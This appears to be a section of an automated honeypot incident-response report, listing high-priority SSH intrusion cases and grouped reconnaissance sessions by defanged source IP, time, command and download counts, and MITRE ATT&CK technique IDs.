| IR-69edaa0afe16 | HIGH | `109.160.32[.]147` | 2026-11-02 05:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c8572af7eccd | HIGH | `20.127.185[.]37` | 2026-11-02 05:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-963890dee249 | HIGH | `20.127.185[.]37` | 2026-11-02 05:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f34b816113c0 | HIGH | `172.203.134[.]70` | 2026-11-02 05:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-07018908720d | HIGH | `172.203.134[.]70` | 2026-11-02 05:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-453cfabf97ca | HIGH | `43.136.83[.]130` | 2026-11-02 05:10 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-aceed10d02f1 | HIGH | `152.32.163[.]183` | 2026-11-02 05:10 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bb74cd031a38 | HIGH | `152.32.163[.]183` | 2026-11-02 05:10 | Y | 0 | 0 | `T1078 · T1592` |
| IR-90be6c055046 | HIGH | `27.254.192[.]185` | 2026-11-02 05:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7318b121d3cb | HIGH | `27.254.192[.]185` | 2026-11-02 05:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d162fd952375 | HIGH | `222.110.147[.]58` | 2026-11-02 05:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-474c31a9c743 | HIGH | `222.110.147[.]58` | 2026-11-02 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4d906bf4775a | HIGH | `1.222.42[.]237` | 2026-11-02 05:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fb620438fa01 | HIGH | `1.222.42[.]237` | 2026-11-02 05:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-490be23fe098 | HIGH | `46.8.224[.]240` | 2026-11-02 05:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2869840009dc | HIGH | `46.8.224[.]240` | 2026-11-02 05:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-edffea2ba84a | HIGH | `20.193.140[.]218` | 2026-11-02 05:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f1361f2ccfa4 | HIGH | `20.193.140[.]218` | 2026-11-02 05:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f7fcd6ee67ee | HIGH | `2.57.122[.]76` | 2026-11-02 05:57 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4e77deb90974 | HIGH | `2.57.122[.]76` | 2026-11-02 05:58 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-79bff46da386 | HIGH | `2.57.122[.]76` | 2026-11-02 05:59 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-445e5b00bc8c | HIGH | `77.239.124[.]155` | 2026-11-02 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-3b2f8ef7028b | HIGH | `109.160.32[.]147` | 2026-11-02 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-c8bf149f9655 | HIGH | `2.57.122[.]76` | 2026-11-02 06:00 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b2744ec6350a | HIGH | `2.57.122[.]76` | 2026-11-02 06:01 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-18b48350b02e | HIGH | `2.57.122[.]76` | 2026-11-02 06:03 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-76b320c1ba27 | HIGH | `2.57.122[.]76` | 2026-11-02 06:04 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-aff83c207be6 | HIGH | `2.57.122[.]76` | 2026-11-02 06:05 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-45140d796c3a | HIGH | `2.57.122[.]76` | 2026-11-02 06:06 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-10cfa576a469 | HIGH | `2.57.122[.]76` | 2026-11-02 06:07 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a1c5da653c27 | HIGH | `2.57.122[.]76` | 2026-11-02 06:09 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6f6c0b76381d | HIGH | `2.57.122[.]76` | 2026-11-02 06:10 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-87f0c85c0c52 | HIGH | `2.57.122[.]76` | 2026-11-02 06:11 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0db609df71c6 | HIGH | `2.57.122[.]76` | 2026-11-02 06:12 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b4d572ebc25c | HIGH | `2.57.122[.]76` | 2026-11-02 06:14 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-377fae504973 | HIGH | `138.226.239[.]233` | 2026-11-02 06:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3d7b6f9a0636 | HIGH | `2.57.122[.]76` | 2026-11-02 06:15 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-c98c412cd452 | HIGH | `2.57.122[.]76` | 2026-11-02 06:16 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-45b17b2d37ae | HIGH | `2.57.122[.]76` | 2026-11-02 06:18 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-41dd4a4bb04f | HIGH | `2.57.122[.]76` | 2026-11-02 06:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-d11515af39f0 | HIGH | `2.57.122[.]76` | 2026-11-02 06:20 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-4caf57cb9576 | HIGH | `2.57.122[.]76` | 2026-11-02 06:21 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a649f99950ce | HIGH | `2.57.122[.]76` | 2026-11-02 06:23 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9b99a9be2071 | HIGH | `2.57.122[.]76` | 2026-11-02 06:24 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-b9ccaad3a753 | HIGH | `2.57.122[.]76` | 2026-11-02 06:25 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5a0f34d39dff | HIGH | `2.57.122[.]76` | 2026-11-02 06:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-01e98411f410 | HIGH | `118.193.69[.]59` | 2026-11-02 06:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a3f4b1ca9f4e | HIGH | `118.193.69[.]59` | 2026-11-02 06:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-314b65cb1069 | HIGH | `42.51.42[.]209` | 2026-11-02 06:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3d5026d357fe | HIGH | `42.51.42[.]209` | 2026-11-02 06:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-47892cee3589 | HIGH | `180.74.81[.]222` | 2026-11-02 06:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-94eb6a7d6f6a | HIGH | `180.74.81[.]222` | 2026-11-02 06:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b3a88c274b73 | HIGH | `177.53.247[.]76` | 2026-11-02 06:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-647abacd9074 | HIGH | `177.53.247[.]76` | 2026-11-02 06:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c18c93ebe8cc | HIGH | `103.43.191[.]43` | 2026-11-02 06:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-404eea135460 | HIGH | `103.43.191[.]43` | 2026-11-02 06:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-05544725757c | HIGH | `103.132.243[.]250` | 2026-11-02 07:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5e3c50117ff3 | HIGH | `103.132.243[.]250` | 2026-11-02 07:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9649e2545f61 | HIGH | `199.165.159[.]153` | 2026-11-02 07:27 | Y | 3 | 0 | `T1078` |
| IR-a85cc17a4a4b | HIGH | `45.156.87[.]168` | 2026-11-02 07:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-71ddc238ef05 | HIGH | `58.208.84[.]103` | 2026-11-02 07:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-36982bf59670 | HIGH | `58.208.84[.]103` | 2026-11-02 07:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0241ae4b65a5 | HIGH | `176.53.159[.]196` | 2026-11-02 07:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-29ff3e99cc98 | HIGH | `93.152.221[.]37` | 2026-11-02 07:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0ce9f574b8bb | HIGH | `45.156.87[.]65` | 2026-11-02 07:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ba8fcf879e11 | HIGH | `185.28.61[.]19` | 2026-11-02 08:18 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8aab635b3596 | HIGH | `185.28.61[.]19` | 2026-11-02 08:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-067e0e1ac579 | HIGH | `109.160.32[.]170` | 2026-11-02 08:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-dc93d47d21a4 | HIGH | `104.236.68[.]24` | 2026-11-02 08:27 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-05cb17a6f2c0 | HIGH | `104.236.68[.]24` | 2026-11-02 08:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3d857695b71c | HIGH | `176.53.159[.]196` | 2026-11-02 08:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2d78fe9848ea | HIGH | `36.255.97[.]230` | 2026-11-02 08:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-20cd76091253 | HIGH | `58.221.60[.]25` | 2026-11-02 08:33 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-836a8569de88 | HIGH | `45.156.87[.]168` | 2026-11-02 08:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-982358bf7921 | HIGH | `189.204.230[.]91` | 2026-11-02 08:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7a911710a37a | HIGH | `189.204.230[.]91` | 2026-11-02 08:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c20cc5aa62ac | HIGH | `103.53.158[.]121` | 2026-11-02 08:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-731cc02e67e6 | HIGH | `103.53.158[.]121` | 2026-11-02 08:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0f50abec9cb6 | HIGH | `45.156.87[.]65` | 2026-11-02 08:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ac643440ae31 | HIGH | `85.11.167[.]72` | 2026-11-02 09:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fe70d2b6bde3 | HIGH | `135.125.235[.]107` | 2026-11-02 09:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9b3e33df42a8 | HIGH | `135.125.235[.]107` | 2026-11-02 09:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4ef4f1fff1a5 | HIGH | `14.29.201[.]186` | 2026-11-02 09:15 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-ee51a54cfc21 | HIGH | `213.194.131[.]120` | 2026-11-02 09:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-645435476a61 | HIGH | `213.194.131[.]120` | 2026-11-02 09:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-92e4ef12eb81 | HIGH | `14.29.201[.]186` | 2026-11-02 09:15 | Y | 0 | 0 | `T1078 · T1592` |
_… 182 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **4** | 2026-11-02 03:03 | 2026-11-02 08:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **3** | 2026-11-02 10:20 | 2026-11-02 14:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]112` | **2** | 2026-11-02 13:41 | 2026-11-02 14:51 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]147` | **2** | 2026-11-02 05:00 | 2026-11-02 06:19 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]35` | **2** | 2026-11-02 14:47 | 2026-11-02 16:08 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `109.160.32[.]37` | **2** | 2026-11-02 10:49 | 2026-11-02 12:14 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-02 02:59 | 2026-11-02 04:03 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-02 07:04 | 2026-11-02 08:06 | 2m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-02 10:20 | 2026-11-02 12:02 | 3m | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | **2** | 2026-11-02 16:13 | 2026-11-02 18:06 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-11-02 16:23 | 2026-11-02 18:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `143.198.208[.]150` | **2** | 2026-11-02 15:19 | 2026-11-02 17:14 | 2m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]7` | **2** | 2026-11-02 11:59 | 2026-11-02 12:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]9` | **2** | 2026-11-02 11:59 | 2026-11-02 12:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.141.233[.]16` | **2** | 2026-11-02 11:48 | 2026-11-02 12:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | **2** | 2026-11-02 08:45 | 2026-11-02 10:02 | 4m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]155` | **2** | 2026-11-02 04:34 | 2026-11-02 06:11 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `80.94.92[.]55` | **2** | 2026-11-02 09:58 | 2026-11-02 10:23 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.141[.]163` | 1 | 2026-11-02 14:12 | 2026-11-02 14:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `102.215.79[.]227` | 1 | 2026-11-02 18:14 | 2026-11-02 18:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.248.158[.]38` | 1 | 2026-11-02 06:35 | 2026-11-02 06:35 | 8s | 0 | `T1592` | 🟢 LOW |
| `104.250.53[.]219` | 1 | 2026-11-02 18:46 | 2026-11-02 18:47 | 5s | 0 | `T1592` | 🟢 LOW |
| `106.227.75[.]197` | 1 | 2026-11-02 11:00 | 2026-11-02 11:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]170` | 1 | 2026-11-02 08:21 | 2026-11-02 08:21 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.38.30[.]39` | 1 | 2026-11-02 07:13 | 2026-11-02 07:14 | 15s | 0 | `T1592` | 🟢 LOW |
| `112.103.62[.]182` | 1 | 2026-11-02 12:39 | 2026-11-02 12:39 | 12s | 0 | `T1592` | 🟢 LOW |
| `112.172.77[.]179` | 1 | 2026-11-02 09:12 | 2026-11-02 09:13 | 29s | 0 | `T1592` | 🟢 LOW |
| `113.141.171[.]139` | 1 | 2026-11-02 10:55 | 2026-11-02 10:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.232.115[.]68` | 1 | 2026-11-02 15:47 | 2026-11-02 15:47 | 12s | 0 | `T1592` | 🟢 LOW |
| `115.191.30[.]208` | 1 | 2026-11-02 04:12 | 2026-11-02 04:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.228[.]55` | 1 | 2026-11-02 13:36 | 2026-11-02 13:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.158[.]238` | 1 | 2026-11-02 20:24 | 2026-11-02 20:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.66[.]203` | 1 | 2026-11-02 14:57 | 2026-11-02 14:57 | 1s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-02 14:06 | 2026-11-02 14:06 | 47s | 0 | `T1592` | 🟢 LOW |
| `137.184.169[.]96` | 1 | 2026-11-02 20:36 | 2026-11-02 20:38 | 120s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-02 15:16 | 2026-11-02 15:18 | 121s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-11-02 18:27 | 2026-11-02 18:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-11-02 20:24 | 2026-11-02 20:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]244` | 1 | 2026-11-02 11:04 | 2026-11-02 11:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]136` | 1 | 2026-11-02 10:56 | 2026-11-02 10:58 | 121s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]140` | 1 | 2026-11-02 05:04 | 2026-11-02 05:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.123[.]67` | 1 | 2026-11-02 02:57 | 2026-11-02 02:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.83[.]66` | 1 | 2026-11-02 08:28 | 2026-11-02 08:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.17.59[.]195` | 1 | 2026-11-02 13:07 | 2026-11-02 13:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `14.18.122[.]240` | 1 | 2026-11-02 10:57 | 2026-11-02 10:59 | 121s | 0 | `T1592` | 🟢 LOW |
| `140.246.137[.]102` | 1 | 2026-11-02 20:26 | 2026-11-02 20:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `154.208.49[.]202` | 1 | 2026-11-02 19:15 | 2026-11-02 19:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.61.65[.]41` | 1 | 2026-11-02 07:06 | 2026-11-02 07:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `160.3.5[.]133` | 1 | 2026-11-02 19:05 | 2026-11-02 19:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-11-02 19:15 | 2026-11-02 19:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.154.29[.]189` | 1 | 2026-11-02 18:57 | 2026-11-02 18:57 | 5s | 0 | `T1592` | 🟢 LOW |
| `172.235.40[.]131` | 1 | 2026-11-02 09:13 | 2026-11-02 09:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]38` | 1 | 2026-11-02 07:43 | 2026-11-02 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.56.233[.]32` | 1 | 2026-11-02 03:43 | 2026-11-02 03:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `175.30.80[.]36` | 1 | 2026-11-02 19:34 | 2026-11-02 19:34 | 13s | 0 | `T1592` | 🟢 LOW |
| `176.101.248[.]249` | 1 | 2026-11-02 03:41 | 2026-11-02 03:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.8.223[.]71` | 1 | 2026-11-02 20:52 | 2026-11-02 20:53 | 32s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-02 09:09 | 2026-11-02 09:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-11-02 17:12 | 2026-11-02 17:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.188[.]13` | 1 | 2026-11-02 20:26 | 2026-11-02 20:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.188[.]229` | 1 | 2026-11-02 07:11 | 2026-11-02 07:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.202[.]69` | 1 | 2026-11-02 11:03 | 2026-11-02 11:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.228[.]149` | 1 | 2026-11-02 06:55 | 2026-11-02 06:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.10.123[.]100` | 1 | 2026-11-02 15:13 | 2026-11-02 15:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]10` | 1 | 2026-11-02 11:59 | 2026-11-02 11:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]16` | 1 | 2026-11-02 19:17 | 2026-11-02 19:17 | 2s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]48` | 1 | 2026-11-02 03:16 | 2026-11-02 03:16 | 1s | 0 | `T1592` | 🟢 LOW |
| `189.245.10[.]9` | 1 | 2026-11-02 14:57 | 2026-11-02 14:57 | 32s | 0 | `T1592` | 🟢 LOW |
| `190.106.104[.]107` | 1 | 2026-11-02 05:56 | 2026-11-02 05:56 | 12s | 0 | `T1592` | 🟢 LOW |
| `190.192.120[.]30` | 1 | 2026-11-02 05:10 | 2026-11-02 05:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]251` | 1 | 2026-11-02 11:54 | 2026-11-02 11:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]251` | 1 | 2026-11-02 16:41 | 2026-11-02 16:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]251` | 1 | 2026-11-02 20:10 | 2026-11-02 20:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.187.101[.]227` | 1 | 2026-11-02 03:16 | 2026-11-02 03:17 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.187.101[.]227` | 1 | 2026-11-02 13:41 | 2026-11-02 13:41 | 13s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-02 04:44 | 2026-11-02 04:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-02 15:14 | 2026-11-02 15:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.37.251[.]67` | 1 | 2026-11-02 14:42 | 2026-11-02 14:42 | 12s | 0 | `T1592` | 🟢 LOW |
| `194.242.103[.]87` | 1 | 2026-11-02 10:29 | 2026-11-02 10:29 | 31s | 0 | `T1592` | 🟢 LOW |
| `195.8.40[.]214` | 1 | 2026-11-02 12:39 | 2026-11-02 12:39 | 11s | 0 | `T1592` | 🟢 LOW |
| `196.189.51[.]4` | 1 | 2026-11-02 15:25 | 2026-11-02 15:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.163.193[.]144` | 1 | 2026-11-02 12:26 | 2026-11-02 12:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.165.159[.]57` | 1 | 2026-11-02 09:23 | 2026-11-02 09:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-11-02 13:54 | 2026-11-02 13:54 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]76` | 1 | 2026-11-02 05:55 | 2026-11-02 05:56 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.118.27[.]165` | 1 | 2026-11-02 13:59 | 2026-11-02 13:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.80.99[.]65` | 1 | 2026-11-02 08:24 | 2026-11-02 08:25 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.83.152[.]2` | 1 | 2026-11-02 11:08 | 2026-11-02 11:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.212.9[.]248` | 1 | 2026-11-02 06:47 | 2026-11-02 06:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.253.2[.]115` | 1 | 2026-11-02 04:22 | 2026-11-02 04:22 | 23s | 0 | `T1592` | 🟢 LOW |
| `212.188.11[.]146` | 1 | 2026-11-02 06:30 | 2026-11-02 06:30 | 12s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-11-02 11:53 | 2026-11-02 11:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.155.196[.]217` | 1 | 2026-11-02 04:44 | 2026-11-02 04:44 | 16s | 0 | `T1592` | 🟢 LOW |
| `221.159.163[.]36` | 1 | 2026-11-02 10:25 | 2026-11-02 10:25 | 29s | 0 | `T1592` | 🟢 LOW |
| `221.166.164[.]167` | 1 | 2026-11-02 03:11 | 2026-11-02 03:11 | 16s | 0 | `T1592` | 🟢 LOW |
| `24.142.249[.]110` | 1 | 2026-11-02 04:50 | 2026-11-02 04:50 | 13s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-11-02 11:16 | 2026-11-02 11:16 | 9s | 0 | `T1592` | 🟢 LOW |
| `31.202.123[.]56` | 1 | 2026-11-02 19:15 | 2026-11-02 19:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.43.242[.]159` | 1 | 2026-11-02 14:31 | 2026-11-02 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-11-02 09:06 | 2026-11-02 09:07 | 40s | 0 | `T1592` | 🟢 LOW |
| `35.210.120[.]245` | 1 | 2026-11-02 03:50 | 2026-11-02 03:50 | 5s | 0 | `T1592` | 🟢 LOW |
| `35.210.13[.]125` | 1 | 2026-11-02 03:50 | 2026-11-02 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.55.40[.]221` | 1 | 2026-11-02 14:12 | 2026-11-02 14:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.186.106[.]100` | 1 | 2026-11-02 15:37 | 2026-11-02 15:37 | 16s | 0 | `T1592` | 🟢 LOW |
| `40.124.116[.]238` | 1 | 2026-11-02 04:25 | 2026-11-02 04:26 | 10s | 0 | `T1592` | 🟢 LOW |
| `40.124.117[.]9` | 1 | 2026-11-02 04:56 | 2026-11-02 04:56 | 9s | 0 | `T1592` | 🟢 LOW |
| `41.139.164[.]123` | 1 | 2026-11-02 15:07 | 2026-11-02 15:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.240.164[.]208` | 1 | 2026-11-02 20:34 | 2026-11-02 20:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.136.83[.]130` | 1 | 2026-11-02 05:10 | 2026-11-02 05:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-02 10:02 | 2026-11-02 10:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]151` | 1 | 2026-11-02 19:02 | 2026-11-02 19:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.156.87[.]65` | 1 | 2026-11-02 07:24 | 2026-11-02 07:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.156.87[.]65` | 1 | 2026-11-02 13:48 | 2026-11-02 13:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.238.144[.]162` | 1 | 2026-11-02 13:04 | 2026-11-02 13:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.64.134[.]75` | 1 | 2026-11-02 08:33 | 2026-11-02 08:33 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.79.172[.]21` | 1 | 2026-11-02 19:55 | 2026-11-02 19:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]110` | 1 | 2026-11-02 12:36 | 2026-11-02 12:36 | 2s | 0 | `T1592` | 🟢 LOW |
| `46.146.56[.]106` | 1 | 2026-11-02 18:57 | 2026-11-02 18:57 | 11s | 0 | `T1592` | 🟢 LOW |
| `47.237.137[.]196` | 1 | 2026-11-02 07:19 | 2026-11-02 07:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.237.72[.]189` | 1 | 2026-11-02 05:27 | 2026-11-02 05:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.2.184[.]242` | 1 | 2026-11-02 20:33 | 2026-11-02 20:34 | 44s | 0 | `T1592` | 🟢 LOW |
| `58.223.165[.]154` | 1 | 2026-11-02 20:18 | 2026-11-02 20:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.240.84[.]3` | 1 | 2026-11-02 10:57 | 2026-11-02 10:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `58.242.117[.]176` | 1 | 2026-11-02 17:47 | 2026-11-02 17:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-02 05:10 | 2026-11-02 05:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-11-02 19:26 | 2026-11-02 19:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]105` | 1 | 2026-11-02 08:31 | 2026-11-02 08:31 | 2s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]134` | 1 | 2026-11-02 17:32 | 2026-11-02 17:32 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]142` | 1 | 2026-11-02 10:33 | 2026-11-02 10:33 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]171` | 1 | 2026-11-02 17:32 | 2026-11-02 17:32 | 15s | 0 | `T1592` | 🟢 LOW |
